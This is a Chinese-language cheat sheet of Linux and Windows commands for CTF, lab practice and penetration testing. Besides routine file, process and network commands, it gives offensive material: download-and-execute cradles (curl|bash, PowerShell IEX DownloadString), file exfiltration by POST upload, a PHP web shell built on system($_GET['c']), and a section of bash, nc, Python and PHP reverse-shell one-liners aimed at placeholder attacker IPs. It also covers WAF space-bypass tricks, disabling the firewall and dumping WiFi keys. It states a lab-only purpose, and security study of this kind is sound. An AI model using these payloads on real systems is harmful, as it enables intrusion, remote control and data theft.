# 系统命令速查手册 · Linux / Windows 对照

> 用途：CTF、靶场练习、渗透测试中的信息收集与文件操作
> 整理日期：2026-10-16
> 约定：**命令中的 `<目标>` 表示需要替换的部分**；两个平台分开列，方便对照记忆

---

## 目录

| 章节 | 内容 |
|---|---|
| [一、目录列举与浏览](#一目录列举与浏览) | 看目录里有什么 |
| [二、文件查找](#二文件查找) | 按名字/权限/时间找文件 |
| [三、文件读取](#三文件读取) | 读文件内容、看编码、看二进制 |
| [四、文件写入与创建](#四文件写入与创建) | 写马、追加、建空文件 |
| [五、文件传输与下载](#五文件传输与下载) | 从远程拉文件、往外传 |
| [六、编码与转码](#六编码与转码) | **回显乱码的解决办法** |
| [七、权限与账号](#七权限与账号) | 提权相关的第一步 |
| [八、进程与服务](#八进程与服务) | 看进程、杀进程、看服务 |
| [九、网络信息](#九网络信息) | 端口、连接、路由 |
| [十、系统信息收集](#十系统信息收集) | 侦察阶段必备 |
| [十一、压缩与解压](#十一压缩与解压) | 打包带走 |
| [十二、反弹 Shell](#十二反弹-shell) | 拿到命令执行之后 |
| [十三、实战技巧与常见坑](#十三实战技巧与常见坑) | 踩过的坑都在这 |

---

## 一、目录列举与浏览

### Linux

```bash
pwd                          # 当前在哪个目录
ls -la                       # 列出全部（含隐藏文件），详细信息
ls -alh                      # 同上，但文件大小显示成 K/M/G
ls -laR                      # 递归列出所有子目录
ls -lat                      # 按修改时间排序（最新的在最上面）
tree -L 2 -a                 # 树状显示两层（可能需自行安装）
stat <文件>                   # 看文件的详细属性（权限、时间、inode）
du -sh <目录>                 # 目录占多大
```

### Windows（cmd）

```cmd
cd                           :: 显示当前目录
dir                          :: 列出当前目录
dir /a                       :: 含隐藏文件和系统文件
dir /s /b                    :: 递归列出，只显示完整路径（超好用）
dir /o-s                     :: 按大小降序排列
dir /t:w                     :: 按修改时间显示
tree /f                      :: 树状显示（含文件）
where <文件名>                :: 在 PATH 里找可执行文件
```

### Windows（PowerShell）

```powershell
Get-Location                 # 当前目录
Get-ChildItem -Force         # 含隐藏项
Get-ChildItem -Recurse -Force
Get-ChildItem -Recurse -Force -File | Select-Object FullName,Length
```

> 💡 **Windows 最实用的列举命令**：`dir /s /b` —— 一次拿到所有文件的完整路径，方便复制粘贴。

---

## 二、文件查找

### Linux

```bash
# 按名字找
find / -name "*.conf" 2>/dev/null
find / -iname "flag*" 2>/dev/null          # -iname 忽略大小写

# 按类型找
find / -type f -name "*.php" 2>/dev/null   # 只要普通文件
find / -type d -name "backup" 2>/dev/null  # 只要目录

# 按权限找（提权必用）
find / -perm -4000 -type f 2>/dev/null     # SUID 文件
find / -perm -2000 -type f 2>/dev/null     # SGID 文件
find / -writable -type d 2>/dev/null       # 当前用户可写的目录

# 按属主找
find / -user www-data 2>/dev/null
find / -group root 2>/dev/null

# 按时间找
find / -mtime -1 2>/dev/null               # 最近 1 天修改过的
find / -newer /etc/passwd 2>/dev/null      # 比某文件更新的

# 找到后对每个文件执行命令
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# 其他
locate <文件名>                             # 查数据库，快但要先 updatedb
which <命令>                                # 命令的可执行文件在哪
whereis <命令>                              # 命令 + 手册位置
```

> ⚠️ `2>/dev/null` 是必须的 —— 不然权限不足的报错会刷屏把结果淹没。

### Windows（cmd）

```cmd
where /r C:\ *.config              :: 从 C:\ 递归找
dir /s /b C:\*.config              :: 同上，另一种写法
dir /s /b C:\*password*            :: 按关键词模糊找
dir /a /s /b C:\ | findstr /i "pass"   :: 列全部再过滤
```

### Windows（PowerShell）

```powershell
# 按名字递归找
Get-ChildItem -Path C:\ -Recurse -Filter *.config -ErrorAction SilentlyContinue

# 多个扩展名
Get-ChildItem -Path C:\ -Recurse -Include *.ini,*.conf,*.config -ErrorAction SilentlyContinue

# 只找隐藏文件
Get-ChildItem -Path C:\ -Recurse -Force -Hidden -ErrorAction SilentlyContinue

# 按内容搜索（相当于 Linux 的 grep -r）
Select-String -Path C:\web\* -Pattern "password" -Recurse -ErrorAction SilentlyContinue

# 按大小找（大于 100MB）
Get-ChildItem -Recurse -File | Where-Object { $_.Length -gt 100MB }
```

---

## 三、文件读取

### Linux

```bash
cat <文件>                    # 全文输出
tac <文件>                    # 倒着输出（最后一行在最前）
less <文件>                   # 分页查看，q 退出（推荐读大文件）
more <文件>                   # 同上，功能少一些
head -n 20 <文件>             # 前 20 行
tail -n 20 <文件>             # 后 20 行
tail -f <文件>                # 实时跟踪（看日志用）
nl <文件>                     # 带行号输出
wc -l <文件>                  # 统计行数

# 翻二进制/看隐藏内容
strings <文件>                # 提取可打印字符串
xxd <文件> | head             # 十六进制 + ASCII
hexdump -C <文件> | head
od -c <文件>

file <文件>                   # 判断文件真实类型（不看扩展名）
```

### Windows（cmd）

```cmd
type <文件>                   :: 输出全文
more <文件>                   :: 分页（按空格翻页，q 退出）
type <文件> | more            :: 同上
find "关键词" <文件>           :: 在文件里找字符串
findstr /i "关键词" <文件>     :: 更强大的搜索（/i 忽略大小写）
findstr /s /i "password" C:\web\*.config   :: 递归搜
```

### Windows（PowerShell）

```powershell
Get-Content <文件>                                   # 全文
Get-Content <文件> -TotalCount 20                    # 前 20 行
Get-Content <文件> -Tail 20                          # 后 20 行
Get-Content <文件> -Wait                             # 实时跟踪
Get-Content <文件> -Encoding UTF8                    # 指定编码读（解决乱码）

# 二进制/十六进制
Format-Hex <文件> | Select-Object -First 10
[System.IO.File]::ReadAllBytes("<文件>")[0..20]

# 搜内容
Select-String -Path <文件> -Pattern "关键词"
```

> 💡 **读文件遇到乱码**：先试 `-Encoding UTF8`，还乱就试 `-Encoding Default`（GBK）、`-Encoding Unicode`。

---

## 四、文件写入与创建

### Linux

```bash
echo "内容" >  <文件>          # 覆盖写入
echo "内容" >> <文件>          # 追加写入

printf '内容\n' > <文件>       # 不自动加换行，格式更可控

# 写多行（最常用）
cat > <文件> << 'EOF'
第一行
第二行
EOF

# 写入并同时显示在屏幕上
echo "内容" | tee <文件>
echo "内容" | tee -a <文件>    # 追加

touch <文件>                   # 创建空文件
> <文件>                       # 把文件清空
dd if=/dev/zero of=<文件> bs=1 count=0 seek=1G   # 造一个 1G 的空文件

# 把内容写进需要 root 的文件（无权限时）
echo "内容" | sudo tee /etc/xxx.conf
```

### Windows（cmd）

```cmd
echo 内容 >  <文件>            :: 覆盖写入（注意：末尾会多一个空行）
echo 内容 >> <文件>            :: 追加

type nul > <文件>              :: 创建空文件（最常用的一招）
copy nul <文件>                :: 同上

copy con <文件>                :: 手动输入内容，结束按 Ctrl+Z 回车
                               :: （老办法，不推荐）

fsutil file createnew <文件> 1024     :: 创建指定字节数的文件
```

> ⚠️ **cmd 的 `echo` 坑**：它按**当前控制台代码页**编码输出。中文系统下输出的是 GBK，写 PHP 文件时可能出问题。要精确控制编码用 PowerShell（见下）。

### Windows（PowerShell）

```powershell
# 标准写法
Set-Content    -Path <文件> -Value "内容"                 # 覆盖
Add-Content    -Path <文件> -Value "内容"                 # 追加
Out-File       -FilePath <文件> -InputObject "内容"

# 指定编码（写 PHP/配置文件时很重要）
Set-Content -Path <文件> -Value "内容" -Encoding UTF8
Set-Content -Path <文件> -Value "内容" -Encoding ASCII
Set-Content -Path <文件> -Value "内容" -Encoding Default   # GBK

# 最精确：完全控制编码、不自动加 BOM / 换行
[System.IO.File]::WriteAllText("<文件>", "内容", (New-Object System.Text.UTF8Encoding $false))
[System.IO.File]::WriteAllBytes("<文件>", [byte[]](0x41,0x42,0x43))

New-Item -Path <文件> -ItemType File -Force                # 创建空文件
```

> 💡 **写 PHP 木马最稳的写法**（UTF-8 无 BOM）：
> ```powershell
> [System.IO.File]::WriteAllText("shell.php", "<?php ... ?>", (New-Object System.Text.UTF8Encoding $false))
> ```
> 用 `Set-Content -Encoding UTF8` 在 PowerShell 5.1 下会**加 BOM**，BOM 会让 PHP 把 `<?php` 前面的字节当输出，导致 header 报错。

---

## 五、文件传输与下载

### Linux

```bash
# 下载
wget http://<目标>/file
wget -O 保存名 http://<目标>/file
curl -O http://<目标>/file           # 用原文件名保存
curl -o 保存名 http://<目标>/file
curl -s http://<目标>/file | bash    # 下载并直接执行

# 上传（往外传）
curl -X POST -F "file=@<本地文件>" http://<你的服务器>/upload
scp <本地文件> user@host:/路径/
scp user@host:/路径/文件 .

# 起一个临时 HTTP 服务（让别人来下载）
python3 -m http.server 8000
php -S 0.0.0.0:8000
busybox httpd -f -p 8000

# nc 直传
# 接收方：nc -lvnp 4444 > 收到的文件
# 发送方：nc <接收方IP> 4444 < 要发的文件

# base64 编码传输（绕过内容检测）
base64 <文件>                      # 编码
base64 -d <编码文件> > <输出文件>   # 解码
```

### Windows（cmd）

```cmd
:: 最经典：certutil 下载
certutil -urlcache -split -f http://<目标>/file 保存名
certutil -urlcache -split -f http://<目标>/file    :: 不指定名字就用原文件名

:: bitsadmin（老系统）
bitsadmin /transfer job /download /priority normal http://<目标>/file C:\保存路径

:: Win10 1803+ 自带 curl
curl.exe -o 保存名 http://<目标>/file

:: certutil 解码 base64（写二进制文件）
certutil -decode encoded.txt output.exe

:: certutil 算哈希
certutil -hashfile <文件> MD5
certutil -hashfile <文件> SHA256
```

### Windows（PowerShell）

```powershell
# 下载三连（按成功率排序）
Invoke-WebRequest -Uri "http://<目标>/file" -OutFile "保存名"
iwr http://<目标>/file -OutFile 保存名                       # 简写

(New-Object Net.WebClient).DownloadFile("http://<目标>/file","保存名")

# 下载到内存直接执行（不落盘）
IEX (New-Object Net.WebClient).DownloadString("http://<目标>/script.ps1")

# 起 HTTP 服务
python -m http.server 8000

# base64 编解码
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<文件>"))
[IO.File]::WriteAllBytes("<输出>", [Convert]::FromBase64String("<base64串>"))
```

---

## 六、编码与转码

> 这一节是实际踩过坑总结的，**回显乱码必看**。

### 先搞清楚：乱码的本质

**字节流本身没错，是"解码方式"和"实际编码"不匹配。**

排查顺序：
1. 这个字节流**实际**是什么编码？
2. 接收方**按什么**编码去解的？
3. 两边不一致 → 乱码

### 判断当前环境编码

| 平台 | 命令 | 说明 |
|---|---|---|
| Windows | `chcp` | `936`=GBK，`65001`=UTF-8 |
| Windows | `[System.Text.Encoding]::Default.WebName` | PowerShell 里看默认编码 |
| Linux | `echo $LANG` | 如 `zh_CN.UTF-8` |
| Linux | `locale` | 完整语言环境 |
| 通用 | `file -i <文件>` | 猜文件编码（Linux） |

### Windows 转码

```cmd
:: 临时把控制台切到 UTF-8（只影响当前窗口）
chcp 65001

:: 在一条命令里临时切换
chcp 65001 >nul & 你的命令
```

```powershell
# 按指定编码读文件
Get-Content <文件> -Encoding UTF8
Get-Content <文件> -Encoding Default      # 系统 ANSI（中文系统=GBK）

# 转码：把 GBK 文件转成 UTF-8
$c = Get-Content <文件> -Encoding Default
Set-Content <输出文件> -Value $c -Encoding UTF8

# 纯 .NET 方式（最可控）
[System.IO.File]::WriteAllText("<输出>", [System.IO.File]::ReadAllText("<输入>", [System.Text.Encoding]::GetEncoding(936)), (New-Object System.Text.UTF8Encoding $false))
```

### Linux 转码

```bash
iconv -f GBK -t UTF-8 <输入> -o <输出>
iconv -f UTF-8 -t GBK <输入>
iconv -f GBK -t UTF-8 -c <输入>          # -c 忽略无法转换的字符

# 批量转换
for f in *.txt; do iconv -f GBK -t UTF-8 "$f" -o "utf8_$f"; done

# 临时改编码环境
export LANG=zh_CN.UTF-8
export LC_ALL=zh_CN.UTF-8
```

### ⭐ Web 场景：回显乱码怎么解决

**问题的典型表现**：执行 `ipconfig` 能看到英文正常、中文全是方块或问号。

**根因**：HTTP 响应头里**没声明 `charset`**，浏览器就按**系统默认的 GBK** 去解 UTF-8 的字节。

```http
Content-Type: text/html          ← 没有 charset，浏览器只能猜
```

**解决办法（改你上传的文件，加一行 header）**：

```php
<?php
header('Content-Type: text/html; charset=utf-8');
echo '<meta charset="utf-8">';            // 双保险
echo '<pre style="font-family:Consolas,monospace">';
system($_GET['c']);
echo '</pre>';
?>
```

| 情况 | 该怎么写 |
|---|---|
| 命令输出本身是 **UTF-8**（`chcp` = 65001） | 只加 `header(...charset=utf-8)` 就行 |
| 命令输出本身是 **GBK**（`chcp` = 936） | 加 `header(...charset=gbk)`，**或者**在 PHP 里转换：<br>`echo iconv('gbk','utf-8//IGNORE', shell_exec($_GET['c']));` |

> ⚠️ **别盲目加 `iconv`** —— 如果源本来就是 UTF-8，再转一次反而会坏掉。**先 `chcp` 确认环境。**

其他语言的对应写法：

```python
# Python
print(content.encode('gbk').decode('utf-8'))
```

```bash
# 命令层面强制 UTF-8 输出
chcp 65001 >nul & ipconfig
```

---

## 七、权限与账号

### Linux

```bash
whoami                       # 当前用户
id                           # 当前用户的 uid/gid/所属组
groups                       # 所属组
sudo -l                      # 当前用户能用 sudo 跑哪些命令（提权第一步）
su - <用户>                   # 切换用户
cat /etc/passwd              # 所有用户（可读）
cat /etc/shadow              # 密码哈希（通常要 root）
cat /etc/sudoers             # sudo 配置
ls -la /etc/cron*            # 看定时任务

chmod 777 <文件>              # 给所有权限
chmod +x <文件>               # 加执行权限
chmod 400 <文件>              # 只读
chown user:group <文件>       # 改属主
chown -R user:group <目录>    # 递归改

# 权限数字含义：rwx = 4+2+1
# 7=rwx  6=rw-  5=r-x  4=r--  0=---
# 三个数字依次是：属主 / 属组 / 其他人
```

### Windows（cmd）

```cmd
whoami                        :: 当前用户
whoami /priv                  :: 当前用户持有的特权（提权必看！）
whoami /groups                :: 所属组
whoami /all                   :: 上面全部 + SID

net user                      :: 列出所有本地用户
net user <用户名>              :: 看某个用户的详情
net localgroup                :: 列出所有本地组
net localgroup administrators :: 看管理员组成员
net share                     :: 看共享目录

:: 权限
icacls <文件>                  :: 查看权限
icacls <文件> /grant <用户>:F   :: 授予完全控制
icacls <文件> /remove <用户>
takeown /f <文件>              :: 夺取所有权
cacls <文件>                   :: 老版本命令（已弃用）

:: 切换用户（需要密码）
runas /user:<用户名> cmd
```

### Windows（PowerShell）

```powershell
whoami /priv
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Group Administrators
Get-Acl <文件> | Format-List
```

> 💡 **Windows 提权第一件事**：`whoami /priv` —— 看有没有 `SeImpersonatePrivilege`、`SeDebugPrivilege`、`SeBackupPrivilege` 这类可利用的特权。

---

## 八、进程与服务

### Linux

```bash
ps aux                       # 所有进程（最常用）
ps -ef                       # 另一种格式（含父子关系）
ps aux | grep <关键词>        # 过滤
top                          # 实时监控，q 退出
htop                         # 更好看的 top

kill <PID>                   # 结束进程
kill -9 <PID>                # 强制结束
pkill -f <关键词>             # 按名字杀

# 服务管理（新系统）
systemctl status <服务>
systemctl start/stop/restart <服务>
systemctl list-units --type=service

# 老系统
service <服务> status

# 定时任务
crontab -l                   # 当前用户的
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/
```

### Windows（cmd）

```cmd
tasklist                     :: 所有进程
tasklist /v                  :: 带窗口标题
tasklist /svc                :: 带所属服务
tasklist | findstr <关键词>   :: 过滤

taskkill /PID <PID> /F       :: 按 PID 强杀
taskkill /IM <进程名> /F      :: 按名字强杀

:: 服务
sc query                     :: 所有服务状态
sc query <服务名>             :: 单个服务
sc qc <服务名>                :: 服务的配置（可执行文件路径等）
sc start/stop <服务名>
net start                    :: 正在运行的服务
net stop <服务名>

:: 定时任务
schtasks /query /fo LIST /v
```

### Windows（PowerShell）

```powershell
Get-Process
Get-Process | Where-Object { $_.ProcessName -like "*sql*" }
Stop-Process -Id <PID> -Force

Get-Service
Get-Service | Where-Object { $_.Status -eq "Running" }
Start-Service / Stop-Service <服务名>

Get-ScheduledTask
Get-CimInstance Win32_Service | Select-Object Name,PathName,StartMode
```

> 💡 `Get-CimInstance Win32_Service` 能一次性看到**所有服务的可执行文件路径**，比自己拼路径快得多。

---

## 九、网络信息

### Linux

```bash
ip a                         # 网卡和 IP（新命令）
ifconfig                     # 老命令（可能没装）
hostname -I                  # 只要 IP

ss -tunlp                    # 监听端口（新命令，推荐）
netstat -tunlp               # 老命令
netstat -antp                # 所有 TCP 连接 + 进程
lsof -i -P -n | grep LISTEN  # 另一种看监听的方式

ping -c 4 <目标>
traceroute <目标>
nslookup <域名>
dig <域名>

# 连通性测试
curl -v http://<目标>:<端口>/
nc -zv <目标> <端口>          # 测端口是否开放
```

### Windows（cmd）

```cmd
ipconfig                     :: IP 信息
ipconfig /all                :: 详细信息（含 MAC、DNS）
ipconfig /displaydns         :: DNS 缓存

netstat -ano                 :: 所有连接 + PID
netstat -anob                :: 加可执行文件名（要管理员）
netstat -ano | findstr LISTENING    :: 只看监听

route print                  :: 路由表
arp -a                       :: ARP 缓存
nslookup <域名>
ping <目标>
tracert <目标>

:: 防火墙
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off     :: 关防火墙（需管理员）

:: 无线
netsh wlan show profiles
netsh wlan show profile name="<名字>" key=clear :: 看 WiFi 密码
```

### Windows（PowerShell）

```powershell
Get-NetIPAddress
Get-NetTCPConnection -State Listen
Test-NetConnection -ComputerName <目标> -Port <端口>
Test-Connection <目标>       # 相当于 ping
Resolve-DnsName <域名>
```

---

## 十、系统信息收集

### Linux

```bash
uname -a                     # 内核版本、架构（找提权 EXP 的第一步）
cat /etc/os-release          # 发行版信息
cat /etc/issue
hostname
uptime                       # 开机时长、负载
date                         # 系统时间
env                          # 环境变量
history                      # 命令历史（可能有密码！）
cat ~/.bash_history

# 看装了哪些软件
dpkg -l                      # Debian/Ubuntu
rpm -qa                      # CentOS/RHEL

# 找有 SUID 的二进制（提权）
find / -perm -4000 -type f 2>/dev/null
```

### Windows（cmd）

```cmd
systeminfo                   :: 系统详细信息（补丁列表在最后，提权必看）
hostname                     :: 主机名
ver                          :: 系统版本
set                          :: 所有环境变量
set <变量名>                  :: 单个变量
date /t & time /t            :: 时间和日期
whoami /all

:: 看补丁
wmic qfe list brief
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### Windows（PowerShell）

```powershell
Get-ComputerInfo
[System.Environment]::OSVersion
Get-HotFix                      # 补丁列表
$env:USERNAME; $env:COMPUTERNAME; $env:PATH
Get-ChildItem Env:

# 找已安装的软件
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion
```

> 💡 **侦察阶段的核心目标**：操作系统版本 + 补丁情况 + 当前权限 + 装了哪些服务。这四样决定了你能用哪些提权手法。

---

## 十一、压缩与解压

### Linux

```bash
tar -czvf 包名.tar.gz <目录>      # 打包压缩（c=create z=gzip v=verbose f=file）
tar -xzvf 包名.tar.gz             # 解压
tar -xzvf 包名.tar.gz -C /目标/    # 解压到指定目录
tar -tzvf 包名.tar.gz             # 只列出内容不解压

zip -r 包名.zip <目录>            # 打 zip
unzip 包名.zip                    # 解 zip
unzip -l 包名.zip                 # 只列出内容
unzip -d /目标/ 包名.zip           # 解到指定目录

gzip <文件>                       # 单文件压缩
gunzip <文件>.gz
```

### Windows（cmd / PowerShell）

```cmd
:: Win10 1803+ 自带 tar（其实是 bsdtar）
tar -czvf 包名.tar.gz <目录>
tar -xzvf 包名.tar.gz
```

```powershell
Compress-Archive -Path <目录> -DestinationPath 包名.zip
Expand-Archive -Path 包名.zip -DestinationPath <目标目录>

# 老系统用 makecab
makecab <文件> 包名.cab
expand 包名.cab -F:* <目标目录>
```

---

## 十二、反弹 Shell

> 拿到命令执行之后，把交互式 Shell 弹回自己的机器。**只在自己搭的靶场里用。**

### Linux 目标 → 你的机器

```bash
# 最常用（不需要 nc 支持 -e）
bash -i >& /dev/tcp/<你的IP>/<端口> 0>&1
bash -c 'bash -i >& /dev/tcp/<你的IP>/<端口> 0>&1'

# nc 版
nc -e /bin/bash <你的IP> <端口>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <你的IP> <端口> >/tmp/f

# Python 版
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<你的IP>",<端口>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP 版
php -r '$sock=fsockopen("<你的IP>",<端口>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**你的机器上先监听**：

```bash
nc -lvnp <端口>
```

### Windows 目标 → 你的机器

```powershell
# PowerShell 反弹（最常用）
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<你的IP>/shell.ps1')"

# nishang / powercat 之类工具生成的 payload 更稳定
```

**用 nc 监听**（Linux 攻击机上）。

### 升级成完全交互式 TTY

反弹回来的 Shell 通常是"哑"的（不能按 Tab、Ctrl+C 会杀会话）。升级：

```bash
# 方法一：python pty
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 然后按 Ctrl+Z
stty raw -echo; fg
# 回车两次，然后
export TERM=xterm

# 方法二：script
script -qc /bin/bash /dev/null
```

---

## 十三、实战技巧与常见坑

### 坑 1 · 回显乱码

见 [第六节](#六编码与转码)。**先 `chcp` 确认环境编码，再决定要不要转换。**

### 坑 2 · 命令没有回显

| 原因 | 排查方法 |
|---|---|
| 命令没装 | `which <命令>` / `where <命令>` 确认 |
| 被过滤 | 换等价命令，或用编码绕过 |
| 函数被禁用 | `php -i \| grep disable_functions` 看 PHP 场景 |
| 输出到了 stderr | 加 `2>&1` |
| 输出太长被截断 | 加 `\| head` 或写到文件再读 |

**写文件再读**是很实用的兜底：

```bash
<命令> > /tmp/out.txt 2>&1; cat /tmp/out.txt
```

```cmd
<命令> > C:\Windows\Temp\out.txt 2>&1 & type C:\Windows\Temp\out.txt
```

### 坑 3 · 空格的替代写法

空格被 WAF 过滤时：

```bash
cat${IFS}/etc/passwd          # Linux
cat</etc/passwd               # 重定向代替空格
{cat,/etc/passwd}             # 大括号展开
```

### 坑 4 · Windows 和 Linux 的路径分隔符

| | 分隔符 | 示例 |
|---|---|---|
| Linux | `/` | `/var/www/html` |
| Windows | `\`（但 `/` 多数情况也能用） | `C:\Windows\Temp` |

在 URL、配置文件里通常两个都能用，但**在 cmd 里用 `/` 有时会被当成参数开关**（比如 `dir /s` 的 `/s`），所以 Windows 下写路径用 `\` 更保险。

### 坑 5 · 临时目录用哪个

| 平台 | 可写临时目录 |
|---|---|
| Linux | `/tmp`、`/dev/shm`、`/var/tmp` |
| Windows | `C:\Windows\Temp`、`%TEMP%`、`C:\Users\Public` |

> 💡 `/dev/shm` 常常被忽略，但它是**内存文件系统**，很多受限环境里唯一可写。

### 坑 6 · 编码问题的"万能排查三步"

```
① 数据本身是什么编码？  →  chcp / file -i / 看字节
② 接收方按什么解码？    →  看 Content-Type 有没有 charset
③ 两边对上就好了        →  改 header 或做一次 iconv
```

**永远先去查"实际是什么"，而不是猜。**

---

## 附：两个平台的高频命令对照速查

| 需求 | Linux | Windows |
|---|---|---|
| 列目录（含隐藏） | `ls -la` | `dir /a` |
| 递归列路径 | `find . -type f` | `dir /s /b` |
| 读文件 | `cat f` | `type f` |
| 分页读 | `less f` | `more f` |
| 看前几行 | `head -20 f` | `Get-Content f -TotalCount 20` |
| 搜文件内容 | `grep -r "x" /` | `findstr /s /i "x" *` |
| 找文件 | `find / -name "x"` | `where /r C:\ x` |
| 写文件 | `echo x > f` | `echo x > f` |
| 建空文件 | `touch f` | `type nul > f` |
| 下载 | `wget URL` | `certutil -urlcache -split -f URL f` |
| 当前用户 | `whoami` | `whoami` |
| 用户特权 | `id` / `sudo -l` | `whoami /priv` |
| 进程列表 | `ps aux` | `tasklist` |
| 杀进程 | `kill -9 PID` | `taskkill /PID x /F` |
| 服务 | `systemctl status x` | `sc query x` |
| 端口监听 | `ss -tunlp` | `netstat -ano` |
| 路由表 | `ip route` | `route print` |
| 解压 tar.gz | `tar -xzvf a.tar.gz` | `tar -xzvf a.tar.gz` |
| 系统版本 | `uname -a` | `systeminfo` |
| 补丁列表 | `dpkg -l` | `wmic qfe list brief` |
| 临时目录 | `/tmp`、`/dev/shm` | `C:\Windows\Temp` |

---

*本手册基于实际靶场练习整理，命令均在 Windows 11 + Ubuntu 环境验证过用法。仅用于授权测试与安全学习。*
